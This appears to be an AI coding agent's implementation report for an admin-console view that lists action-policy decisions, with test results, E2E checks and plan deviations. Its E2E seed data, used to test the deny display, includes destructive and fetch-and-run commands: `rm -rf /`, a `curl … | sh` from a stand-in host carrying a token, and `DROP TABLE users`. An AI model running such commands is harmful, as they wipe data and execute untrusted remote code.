---
story: STORY-019
prd: PRD-016
plan: .agents/plans/PRD-016-action-policy-rules/completed/STORY-019-admin-console-actions-view.plan.md
epic_branch: epic/PRD-016-action-policy-rules
commit: pending
status: COMPLETE
completed: 2026-11-15
---

# Implementation Report — STORY-019: Admin console: the Actions view

**Plan**: `.agents/plans/PRD-016-action-policy-rules/completed/STORY-019-admin-console-actions-view.plan.md`
**Epic Branch**: `epic/PRD-016-action-policy-rules`
**Commit**: `pending`

## Summary

A fourth console view, **Actions**, at `/admin/actions`, joins Register, Summary and Usage in the masthead switch. It lists the newest 500 action decisions of the chosen kind (Denied by default; Flagged, Allowed, All), with columns Time, User, Role, Tool, Operation, Target, Rule, Decision, Allowed by, under a scope line that states the window against the true total ("500 most recent of 529 denied"). The filter re-reads the database for the chosen decision (`choose_actions_filter` returns the background event `load_actions`), so old denies are never buried under newer allows. Data comes from `list_action_decisions` and `count_action_decisions`, imported by name. The view has its own fault (`actions_error`) and empty state (names the filter and PRD-017, ends in Refresh).

## Tasks Completed

| # | Task | File | Status |
|---|------|------|--------|
| 1 | Copy | `chat_ui/chat_ui/admin_copy.py` | done |
| 2 | `ActionRow`, `DECISION_*`, `to_action_rows` | `admin_models.py`, `admin_formatting.py` | done |
| 3 | State: reads, filter, computed vars, `load_actions`, read inside `load()` | `admin_state.py` | done |
| 4 | Component | `components/actions.py` (new) | done |
| 5 | Shell link, route, page | `components/admin_shell.py`, `chat_ui.py` | done |
| 6 | Pinned-set and fixture edits | `tests/test_admin_shell.py`, `test_admin_palette.py`, `test_copy.py`, `test_admin_state.py`, `test_usage_view.py` | done |
| 7 | PII census guard | `tests/test_pii_redaction_integration.py` (run, untouched) | done |
| 8 | New tests | `tests/test_actions_view.py` (77 tests) | done |
| 9 | Targeted validation | see below | done |
| 10 | E2E in the running console | see below | done |

## Validation Results

| Check | Result |
|-------|--------|
| Backend import | OK |
| chat_ui import probe | `tests/test_chat_ui_startup_guard.py` passed; `import chat_ui.chat_ui` registers `admin/actions` |
| Targeted tests | 879 passed, 1 failed (see note), 0 skipped |
| Full suite | deferred to orchestrator (user decision) |
| E2E (headless Chrome via Playwright, `reflex run --env prod --single-port`, throwaway libSQL container) | all steps below passed |

Targeted set: `tests/test_actions_view.py tests/test_usage_view.py tests/test_admin_shell.py tests/test_admin_state.py tests/test_admin_copy.py tests/test_copy.py tests/test_admin_palette.py tests/test_admin_models.py tests/test_admin_formatting.py tests/test_register.py tests/test_summary.py tests/test_chat_ui_startup_guard.py tests/test_untouched_app.py tests/test_pii_redaction_integration.py tests/test_caddyfile_routes.py tests/test_render_invariants.py`.

**The one failure is pre-existing test-order pollution, not this story.** `tests/test_render_invariants.py::test_the_probe_actually_loaded_the_seeded_record` fails (`7 == 4` rows) only when `tests/test_usage_view.py` runs before it in the same invocation. I reproduced it identically with this story's changes stashed (`test_usage_view.py` + `test_render_invariants.py`: 1 failed, 110 passed). Alone it passes (59 passed), and with `test_register.py`/`test_summary.py` it passes (330 passed). In the repo's alphabetical order `test_render_invariants.py` runs before `test_usage_view.py`.

### E2E (measured)

Seeded through the real writers (`evaluate()` then `action_audit.record()`) for `ana.torres` (user) and `dba.lopez` (dba): `rm -rf /`, `curl https://x.example/install.sh?token=SECRET123 | sh`, a 320-character `rm -rf` target, `make release` (flag), `DROP TABLE users`, `DELETE FROM t` (dba allow with `action:sql:write`), plus 520 deny rows.

- Masthead reads Register, Summary, Usage, Actions; the Actions link is current on `/admin/actions` (rendered as the current item). Sign out stays on screen at 390px (x=322, w=44 of 390).
- Opens on Denied: only deny rows, newest first; nine column heads in order; scope line "500 most recent of 529 denied" with the Refreshed stamp.
- Chips: Flagged "2 most recent of 2 flagged", Allowed "1 most recent of 1 allowed", All "500 most recent of 532 recorded", back to Denied; `aria-pressed` follows each. Keyboard: focusing a chip and pressing Enter selects it. The focus ring was measured on the control the Tab sequence landed on (Sign out: 2px solid outline from the global `:focus-visible` rule), not on a chip itself; chips are real `<button>`s with no local outline, and `test_the_filter_chips_are_single_select_buttons` guards that, so they take the same rule.
- The dba allow row shows `action:sql:write` under Allowed by; rows without a permission show the absent mark.
- Long target truncates (`scrollWidth > clientWidth`) and its `title` holds the full 320 characters; the rule cell's title is the recorded reason. The redacted URL shows `token=***`; `SECRET123` appears nowhere in the DOM or any title.
- 520 rows: 501 `[role=row]` (head + 500), scroll inside `.hx-scroll` (scrollHeight 18032 vs clientHeight 743). At 390px `documentElement.scrollWidth == innerWidth == 390` (no page scroll); at 1920px the same, and Role sits next to User (bounded tracks, Target takes the free width).
- Empty (rows deleted, Refresh): "No denied actions recorded." plus the PRD-017 body ending "Refresh to read again."; zero column heads; All shows "No actions recorded.".
- Fault (database container stopped, Refresh): the panel reads "Could not read the action decisions. Nothing on screen has changed. Refresh to try again. (...)"; after restart and Refresh it is gone.
- Sign out: the gate returns, zero rows, no "most recent of" text; `/admin/usage` unauthenticated shows no actions data.
- Dark ground at 390px: tags, chips and the scope line stay legible (screenshot reviewed).
- `theme.py` was not changed: the four-word switch fits at 390px (it takes its own row, the existing rule).

Not measured: a real touch device. `title` is a hover device, see Deviations.

Cleanup: the Reflex process and the throwaway container `harness-libsql-e2e019` (port 8082) were removed; `chat_ui/reflex.lock/{bun.lock,package.json}` were reverted. The shared `harness-libsql-dev` was not touched.

## Files Changed

| File | Action |
|------|--------|
| `chat_ui/chat_ui/components/actions.py` | CREATE |
| `chat_ui/chat_ui/admin_copy.py` | UPDATE (Actions copy section) |
| `chat_ui/chat_ui/admin_models.py` | UPDATE (`ActionRow`) |
| `chat_ui/chat_ui/admin_formatting.py` | UPDATE (`DECISION_*`, `to_action_rows`) |
| `chat_ui/chat_ui/admin_state.py` | UPDATE (named read imports, constants, `read_actions`, vars, computed vars, `choose_actions_filter`, `load_actions`, read inside `load()`) |
| `chat_ui/chat_ui/components/admin_shell.py` | UPDATE (`ROUTE_ACTIONS`, `VIEW_ACTIONS`, fourth link) |
| `chat_ui/chat_ui/chat_ui.py` | UPDATE (`admin_actions_page`, one `add_page`) |
| `tests/test_actions_view.py` | CREATE |
| `tests/test_admin_shell.py`, `tests/test_admin_palette.py`, `tests/test_copy.py` | UPDATE (pinned sets, each with a PRD-016 STORY-019 comment) |
| `tests/test_admin_state.py`, `tests/test_usage_view.py` | UPDATE (fixture only: the two action reads stubbed; no assertion changed) |
| `.agents/stories/.../STORY-020-docs-and-promotion.md` | orchestrator's uncommitted edit, staged here as instructed |

## Deviations from Plan

1. **AC 1's `audit:read:all`**: the console has no RBAC; `ADMIN_TOKEN` is the gate and a token holder reads every row in-process. No permission check added (orchestrator decision 1).
2. **Full text is a `title` only**: no per-row disclosure, so touch devices cannot read a truncated target (orchestrator decision 2). STORY-020 documents it.
3. **The filter re-reads the database** rather than filtering loaded rows (plan D-A); the PRD-006 "filtering never re-reads" rule is the Register's.
4. **Pinned sets extended** (route/page-key sets, view count 3 to 4, copy census, module globs) and two fixtures stubbed, each with a PRD-016 comment (orchestrator decision 3).
5. **`read_actions` takes no clock of its own from `admin_state`**: `to_action_rows` reads its own, because `test_the_retry_clears_the_fault_and_advances_the_stamp` patches the module's `datetime` and counts reads. Relative times and the Refreshed stamp can differ by a straggling second.
6. **Time cell shows the relative time with the absolute timestamp as its `title`**, rather than both stacked (keeps one row height at 390px).
7. **Reflex skills are not installed** in this environment; Reflex behaviour was taken from the existing modules and verified in the running app (Var `title` on a cell, `rx.cond` on a str var, background event returned from a handler all work).
8. **Noted for the orchestrator**: `.agents/PRDs/PRD-016-action-policy-rules/PRD.md` has an uncommitted stray ` k` before the opening `---` (first line). It is not mine and was not staged.

## Tests Written

`tests/test_actions_view.py` (77 tests): formatting and projection (no storage aid reaches a row, absent marks, timestamps, decision vocabulary equals `ACTION_DECISION_VALUES`, window equals `ACTIONS_LIMIT_MAX`); storage through `evaluate()` and `record()` (deny only and newest first, each filter, blank/unknown filter reads Denied, counts, 520 seeded rows capped at 500, a deny older than 510 allows still found, console equals API read); state (default Denied read, each chip re-reads with the right `decision`, unknown key ignored, empty titles per filter, first failed read is the fault state, other views untouched, failed summary still refreshes actions, recovery, chip does not lock Refresh, stale result dropped, unauthenticated reads nothing, `sign_out` clears, vars declared, read functions imported and writer absent); component probe (heads, `title` bindings, four `aria-pressed` buttons wired to the event, no local outline, empty arm text and no grid, own fault panel, only ground and the three decision inks, no chart/motion/auto-refresh/row action, every string from `admin_copy`, no chat or sibling-view imports, scroll container and `min_width`, filter wraps); route and switch (registered without `on_load` or sitemap, not a backend path, fourth link).

## Acceptance Criteria

- [x] AC1: fourth view in the switch, route through `admin_page(...)`: `tests/test_admin_shell.py` (switch labels, `aria-current`, page keys), `test_actions_view.py::test_the_route_is_registered_...`, E2E masthead. Permission wording deviates (see 1).
- [x] AC2: deny by default, nine columns, a control switches deny/flag/allow/all and the list follows: `test_load_reads_denied_by_default`, `test_a_chip_returns_the_read_and_the_read_follows_the_filter`, `test_each_filter_reads_its_own_decision_and_all_reads_every_one`, E2E chips.
- [x] AC3: empty state says what, why (PRD-017) and the action: `test_the_empty_state_says_what_why_and_what_next`, `test_the_empty_state_names_the_filter_and_is_not_a_fault`, E2E.
- [x] AC4: 500 rows and phone width usable: `test_500_rows_are_capped_at_500_and_the_total_is_stated`, `test_the_table_scrolls_in_its_own_container`, `test_the_full_text_is_a_title_on_the_truncated_cells`, `test_the_filter_chips_are_single_select_buttons`; E2E at 390px (no page scroll, truncation, visible focus). Full text on touch is not available (see 2).
- [x] AC5: Register, Summary, Usage unchanged and green: `test_register.py`, `test_summary.py`, `test_usage_view.py`, `test_admin_shell.py`, `test_admin_state.py` pass with only the pinned-set and fixture edits.
- [x] All tasks completed
- [x] `from app.main import app` imports; chat_ui import probe passes
- [x] Follows existing patterns (Usage view, Register controls)
